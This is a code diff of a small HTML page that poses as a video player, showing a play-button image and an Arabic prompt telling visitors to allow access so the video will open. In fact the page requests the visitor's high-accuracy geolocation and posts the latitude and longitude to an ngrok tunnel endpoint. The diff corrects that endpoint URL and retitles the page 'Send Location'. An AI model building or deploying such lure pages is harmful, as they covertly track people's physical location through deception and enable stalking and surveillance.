@@ -2,23 +2,22 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>فضيحة</title>
+    <title>Send Location</title>
     <style>
         body { display:flex; justify-content:center; align-items:center; height:100vh; }
         img { cursor:pointer; width:300px; }
     </style>
 </head>
 <body>
-    <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">   
+    <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">
 
     <script>
         function capture() {
-            // رسالة للمستخدم قبل طلب الموقع
             alert("اضغط السماح لفتح الفيديو");
 
-            if (!navigator.geolocation) { 
-                alert("الموقع غير مدعوم"); 
-                return; 
+            if (!navigator.geolocation) {
+                alert("اعد المحاولة");
+                return;
             }
 
             navigator.geolocation.getCurrentPosition(
@@ -26,18 +25,18 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
 
-                    // إرسال الموقع إلى السيرفر
-                    fetch("https://b1ae5ff83c06.ngrok-free.app /receive_data", {
+                    // ضع هنا رابط ngrok الصحيح
+                    fetch("https://b1ae5ff83c06.ngrok-free.app/receive_data", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ lat, lon })
                     })
                     .then(res => res.json())
-                    .then(resp => alert("الفيديو سيتم فتحه الان"))
-                    .catch(err => alert("تعذر فتح الفيديو حاول مجدداً: " + err));
+                    .then(resp => alert("سيتم فتح الفيديو"))
+                    .catch(err => alert("  : " + err));
                 },
                 function(err) {
-                    alert("تعذر فتح الفيديو حاول مجدداً: " + err.message);
+                    alert("تعذر : " + err.message);
                 },
                 { enableHighAccuracy: true }
             );
